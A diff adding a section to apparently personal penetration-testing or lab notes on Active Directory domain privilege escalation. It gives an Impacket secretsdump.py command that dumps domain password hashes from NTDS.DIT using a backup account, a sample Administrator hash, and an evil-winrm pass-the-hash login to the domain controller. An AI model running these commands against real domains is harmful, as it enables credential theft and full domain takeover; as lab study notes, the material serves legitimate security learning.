@@ -77,10 +77,22 @@ smbclient:
           4-  Decode Base 64 in cmd line
                   base64 --decode <file OR chars>
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-DOMAIN Privilege Escalation 
+DOMAIN Privilege Escalation         SECRETSDUMP.PY            Pass-the-has with EVIL-WINRM
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Sync Up!
 
+Now that we have new user account credentials, we may have more privileges on the system than before. The username is "backup", the backup account for the Domain
+Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. Including password hashes
 
+We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account 
+(that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.
+
+1- secretsdump.py -just-dc <username:password@DC'S_IP_ADDRESS>                         <- i.e.    admin:password@10.1.9.2
+        NOTE: this dumps NTDS.DIT
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+                                                           --------------------------------
+                                                           The Hash
+2- evil-winrm -i <DC's_IP> -u <USER_ACCOUNT> -H <HASH>
 
 
 
